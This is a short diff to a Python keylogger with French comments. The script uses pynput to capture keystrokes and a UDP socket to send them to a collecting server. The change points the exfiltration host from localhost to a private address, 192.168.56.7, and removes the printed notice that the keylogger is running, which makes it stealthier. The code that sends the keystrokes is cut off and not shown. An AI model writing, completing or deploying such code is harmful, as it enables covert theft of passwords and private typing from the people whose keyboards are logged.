@@ -3,12 +3,10 @@ from pynput.keyboard import Listener
 
 # définition de l'adresse du serveur auquel envoyer les données
 # remplacer par l'ip externe du serveur
-host = "127.0.0.1"
+host = "192.168.56.7"
 
 port = 8888
 server = (host, port)
-
-print("KEYLOGGER en marche!")
 
 # création du socket : utilisation du protocole UDP
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
